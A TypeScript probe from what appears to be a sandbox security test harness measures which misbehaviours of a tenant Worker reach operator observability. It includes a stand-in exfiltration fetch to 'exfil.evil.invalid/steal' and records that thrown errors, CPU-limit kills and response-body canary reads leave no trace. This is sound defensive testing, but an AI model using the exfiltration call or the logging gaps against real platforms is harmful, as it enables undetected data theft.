import type { Probe } from "./index.js";
import { base, invokeTenant, namespaceMode, outboundLogEvents } from "./_helpers.js";

const TEST_ID = "P-OBS-01";

/**
 * P-OBS-01 — Trace/observability capture completeness.
 *
 * Maps what the platform's operator observability actually receives from a misbehaving
 * user Worker. NOTE: no dedicated trace Worker is deployed in this apparatus — the only
 * operator-queryable channel is wulf-outbound's R2 log (`OUTBOUND_LOG`). Prey performs
 * a representative set of actions (blocked egress, thrown error, CPU-limit overrun,
 * canary read) and the probe diffs what each emits against what the R2 log captured.
 */
export const pObs01: Probe = async (c) => {
  const mode = namespaceMode(c.req);

  // (1) blocked egress — fetch a non-allowlisted host; wulf-outbound 403s and logs it.
  await safeInvoke(c, "try-fetch", { target: "https://exfil.evil.invalid/steal" }, mode);
  // (2) thrown error with marker — surfaces to dispatch, not persisted anywhere.
  await safeInvoke(c, "response-exfil", { channel: "error" }, mode);
  // (3) CPU-limit termination — exception to dispatch, no persistent trace.
  await safeInvoke(c, "cpu-burn", { ms: "250" }, mode, { cpuMs: 10, subRequests: 5 });
  // (4) canary read via response body — no egress, no error, no log.
  await safeInvoke(c, "response-exfil", { channel: "body" }, mode);

  const emitted = ["blocked_egress", "thrown_error", "cpu_limit_hit", "canary_read"];
  const traceEvents = await outboundLogEvents(c.env, TEST_ID, c.runId);
  const captured: string[] = [];
  if (traceEvents.some((e) => e.allowed === false)) captured.push("blocked_egress");

  const attribution = traceEvents.length > 0;

  return base({
    test_id: TEST_ID,
    track: "platform",
    description: "Trace/observability capture completeness for a misbehaving WfP user Worker",
    result: "informational",
    severity: "informational",
    run_id: c.runId,
    details: {
      namespace: mode,
      no_trace_worker_deployed: true,
      operator_observability: "wulf-outbound R2 log only (no tail/trace Worker)",
      events_emitted_by_prey: emitted,
      events_captured_by_observability: captured,
      uncaptured_events: emitted.filter((e) => !captured.includes(e)),
      tenant_attribution_present: attribution,
      attribution_fields: attribution ? ["customer_name", "test_id", "run_id"] : [],
      outbound_log_event_count: traceEvents.length,
      note: "Only blocked egress is captured (with tenant attribution); thrown errors, CPU-limit terminations, and pure response/in-memory canary reads leave no operator-queryable trace.",
    },
  });
};

async function safeInvoke(
  c: Parameters<Probe>[0],
  cmd: string,
  params: Record<string, string>,
  mode: "trusted" | "untrusted",
  limits?: DynamicDispatchLimits,
): Promise<void> {
  try {
    await invokeTenant(c, "tenant-prey", cmd, params, limits ? { mode, limits } : { mode });
  } catch {
    // Limit overruns / thrown markers are expected; we only care what gets traced.
  }
}
